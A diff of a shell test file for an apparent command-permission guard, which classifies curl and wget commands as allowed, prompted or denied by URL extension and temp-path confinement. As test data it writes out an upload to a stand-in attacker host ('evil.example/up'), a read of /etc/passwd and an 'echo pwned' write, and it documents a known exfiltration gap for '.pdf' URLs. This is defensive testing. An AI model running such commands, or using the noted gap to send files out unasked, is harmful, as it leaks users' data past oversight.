@@ -112,8 +112,35 @@ t noallow 'curl file:///etc/passwd -o /tmp/pgt/p'
 t noallow 'curl https://x -o /tmp/pgt/f user@host:/etc/x'
 t noallow 'wget https://example.com/x -O /tmp/pgt/y'
 t ask     'curl https://example.com/x'
-# Documented concession: egress is unprompted inside a tmp-confined command.
-t allow   'curl -T /tmp/pgt/f https://evil.example/up'
+# Egress inside a tmp-confined command is the documented concession. Condition 7
+# narrowed it without being designed to: an upload endpoint rarely ends in an
+# inert extension, so most exfil URLs now ask. The residual case is real though,
+# and stays pinned here so nobody mistakes the narrowing for a fix.
+t ask   'curl -T /tmp/pgt/f https://evil.example/up'
+t allow 'curl -T /tmp/pgt/f https://evil.example/up.pdf'
+
+section '# fetching an inert file type stays silent; anything else asks'
+t allow 'curl https://example.com/spec.pdf -o /tmp/pgt/spec.pdf'
+t allow 'curl https://example.com/data.json -o /tmp/pgt/d.json'
+t allow 'curl https://example.com/page.html -o /tmp/pgt/p.html'
+t allow 'curl https://example.com/pic.PNG -o /tmp/pgt/p.png'
+t allow 'curl https://example.com/clip.mp4 -o /tmp/pgt/c.mp4'
+t ask   'curl https://example.com/install.sh -o /tmp/pgt/i.sh'
+t ask   'curl https://example.com/tool.py -o /tmp/pgt/t.py'
+t ask   'curl https://example.com/app.dmg -o /tmp/pgt/a.dmg'
+t ask   'curl https://example.com/pkg.tar.gz -o /tmp/pgt/p.tgz'
+t ask   'curl https://example.com/bin.exe -o /tmp/pgt/b.exe'
+# No extension is unknown, not safe — `curl https://sh.rustup.rs` looks like this.
+t ask   'curl https://sh.rustup.rs -o /tmp/pgt/r'
+t ask   'curl https://api.example.com/v1/repos -o /tmp/pgt/r.json'
+# A query string must not be able to hide the real extension...
+t ask   'curl https://example.com/get?file=install.sh -o /tmp/pgt/x'
+# ...but stripping it must not blind us to a genuine one either.
+t allow 'curl https://example.com/a.pdf?x=1 -o /tmp/pgt/a.pdf'
+# Every URL must qualify, not just the first.
+t ask   'curl https://example.com/a.pdf https://example.com/b.sh -o /tmp/pgt/o'
+# Commands that touch no network are unaffected by condition 7.
+t allow 'cat /tmp/pgt/f'
 
 section '# a temp path is confirmed against the filesystem, not the string'
 t ask 'echo pwned > /tmp/pgt/livelink'
